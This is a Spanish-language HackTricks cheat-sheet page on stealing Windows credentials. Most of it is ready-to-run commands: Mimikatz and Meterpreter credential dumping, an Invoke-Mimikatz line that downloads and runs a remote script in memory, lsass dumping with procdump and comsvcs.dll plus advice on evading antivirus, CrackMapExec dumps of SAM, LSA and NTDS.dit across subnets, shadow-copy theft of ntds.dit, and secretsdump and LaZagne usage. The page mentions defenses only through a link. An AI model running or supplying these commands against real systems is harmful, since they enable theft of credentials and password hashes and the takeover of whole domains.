# Robando Credenciales de Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lee tutoriales sobre errores web3

🔔 Recibe notificaciones sobre nuevos programas de recompensas por errores

💬 Participa en discusiones comunitarias

## Mimikatz de Credenciales
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encuentra otras cosas que Mimikatz puede hacer en** [**esta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Aprenda sobre algunas posibles protecciones de credenciales aquí.**](credentials-protections.md) **Estas protecciones podrían evitar que Mimikatz extraiga algunas credenciales.**

## Credenciales con Meterpreter

Use el [**Plugin de Credenciales**](https://github.com/carlospolop/MSF-Credentials) **que he creado para buscar contraseñas y hashes** dentro de la víctima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Evadiendo AV

### Procdump + Mimikatz

Como **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**es una herramienta legítima de Microsoft**, no es detectada por Defender.\
Puedes usar esta herramienta para **volcar el proceso lsass**, **descargar el volcado** y **extraer las credenciales localmente** del volcado.

{% code title="Volcar lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extraer credenciales del volcado" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Este proceso se realiza automáticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Algunos **AV** pueden **detectar** como **malicioso** el uso de **procdump.exe para volcar lsass.exe**, esto se debe a que están **detectando** las cadenas **"procdump.exe" y "lsass.exe"**. Por lo tanto, es más sigiloso **pasar** como **argumento** el **PID** de lsass.exe a procdump **en lugar de** el **nombre lsass.exe.**

### Volcando lsass con **comsvcs.dll**

Hay una DLL llamada **comsvcs.dll**, ubicada en `C:\Windows\System32` que **vuelca la memoria del proceso** cada vez que **falla**. Esta DLL contiene una **función** llamada **`MiniDumpW`** que está escrita para que pueda ser llamada con `rundll32.exe`.\
Los dos primeros argumentos no se utilizan, pero el tercero se divide en 3 partes. La primera parte es el ID del proceso que se volcará, la segunda parte es la ubicación del archivo de volcado y la tercera parte es la palabra **full**. No hay otra opción.\
Una vez que se han analizado estos 3 argumentos, básicamente esta DLL crea el archivo de volcado y vuelca el proceso especificado en ese archivo de volcado.\
Gracias a esta función, podemos usar **comsvcs.dll** para volcar el proceso lsass en lugar de subir procdump y ejecutarlo. (Esta información fue extraída de [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
Solo debemos tener en cuenta que esta técnica solo se puede ejecutar como **SYSTEM**.

**Puede automatizar este proceso con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Volcado de lsass con el Administrador de tareas**

1. Haga clic derecho en la barra de tareas y haga clic en Administrador de tareas.
2. Haga clic en Más detalles.
3. Busque el proceso "Proceso de Autoridad de Seguridad Local" en la pestaña Procesos.
4. Haga clic derecho en el proceso "Proceso de Autoridad de Seguridad Local" y haga clic en "Crear archivo de volcado".

### Volcado de lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un binario firmado por Microsoft que forma parte del conjunto de herramientas [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## CrackMapExec

### Volcado de hashes SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Volcado de secretos LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Volcar el archivo NTDS.dit del controlador de dominio objetivo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Volcar el historial de contraseñas de NTDS.dit desde el controlador de dominio objetivo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar el atributo pwdLastSet para cada cuenta de NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lee tutoriales sobre errores web3

🔔 Recibe notificaciones sobre nuevos programas de recompensas por errores

💬 Participa en discusiones comunitarias

## Robando SAM & SYSTEM

Estos archivos deberían estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM._ Pero **no puedes simplemente copiarlos de manera regular** porque están protegidos.

### Desde el Registro
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Descarga** esos archivos en tu máquina Kali y **extrae los hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Copia de sombra de volumen

Puedes realizar una copia de los archivos protegidos utilizando este servicio. Debes ser Administrador.

#### Usando vssadmin

El binario vssadmin solo está disponible en las versiones de Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Pero puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro utilizado es "C:" y se guarda en C:\users\Public) pero puedes usar esto para copiar cualquier archivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Por último, también se puede utilizar el script de PowerShell [**Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciales de Active Directory - NTDS.dit**

El archivo Ntds.dit es una base de datos que almacena datos de Active Directory, incluyendo información sobre objetos de usuario, grupos y membresía de grupos. Incluye los hashes de contraseñas de todos los usuarios en el dominio.

El importante archivo NTDS.dit se encuentra en: _%SystemRoom%/NTDS/ntds.dit_\
Este archivo es una base de datos _Extensible Storage Engine_ (ESE) y está "oficialmente" compuesto por 3 tablas:

* **Tabla de datos**: Contiene la información sobre los objetos (usuarios, grupos...)
* **Tabla de enlaces**: Información sobre las relaciones (miembro de...)
* **Tabla SD**: Contiene los descriptores de seguridad de cada objeto

Más información sobre esto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utiliza _Ntdsa.dll_ para interactuar con ese archivo y es utilizado por _lsass.exe_. Entonces, **parte** del archivo **NTDS.dit** podría estar ubicado **dentro de la memoria de `lsass`** (puede encontrar los datos de acceso más recientes probablemente debido a la mejora del rendimiento mediante el uso de una **caché**).

#### Descifrando los hashes dentro de NTDS.dit

El hash está cifrado 3 veces:

1. Descifrar la clave de cifrado de contraseña (**PEK**) usando el **BOOTKEY** y **RC4**.
2. Descifrar el **hash** usando **PEK** y **RC4**.
3. Descifrar el **hash** usando **DES**.

**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** utilizando el **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Es por eso que para obtener las credenciales del archivo NTDS.dit **necesita los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit usando Ntdsutil

Disponible desde Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
También se puede utilizar el truco de [**volume shadow copy**](./#stealing-sam-and-system) para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del archivo **SYSTEM** (de nuevo, [**dúmpealo del registro o utiliza el truco de volume shadow copy**](./#stealing-sam-and-system)).

### **Extrayendo hashes de NTDS.dit**

Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes utilizar herramientas como _secretsdump.py_ para **extraer los hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
También puedes **extraerlas automáticamente** utilizando un usuario de administrador de dominio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para archivos **grandes NTDS.dit** se recomienda extraerlos usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, también se puede utilizar el módulo de **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Extrayendo objetos de dominio de NTDS.dit a una base de datos SQLite**

Los objetos NTDS se pueden extraer a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen secretos, sino también objetos completos y sus atributos para una mayor extracción de información cuando ya se ha recuperado el archivo NTDS.dit sin procesar.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
El archivo `SYSTEM` es opcional pero permite la descifrado de secretos (hashes NT y LM, credenciales suplementarias como contraseñas en texto claro, claves kerberos o de confianza, historiales de contraseñas NT y LM). Junto con otra información, se extraen los siguientes datos: cuentas de usuario y máquina con sus hashes, indicadores UAC, marca de tiempo del último inicio de sesión y cambio de contraseña, descripciones de cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol de unidades organizativas y membresía, dominios de confianza con tipo, dirección y atributos de confianza...

## Lazagne

Descargue el archivo binario desde [aquí](https://github.com/AlessandroZ/LaZagne/releases). Puede utilizar este archivo binario para extraer credenciales de varios programas.
```
lazagne.exe all
```
## Otras herramientas para extraer credenciales de SAM y LSASS

### Windows Credentials Editor (WCE)

Esta herramienta se puede utilizar para extraer credenciales de la memoria. Descárguela desde: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrae credenciales del archivo SAM.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrae credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Descárgalo desde: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) y simplemente **ejecútalo** y las contraseñas serán extraídas.

## Defensas

[**Aprende sobre algunas protecciones de credenciales aquí.**](credentials-protections.md)

​

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lee tutoriales de errores web3

🔔 Recibe notificaciones sobre nuevos programas de recompensas por errores

💬 Participa en discusiones de la comunidad

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
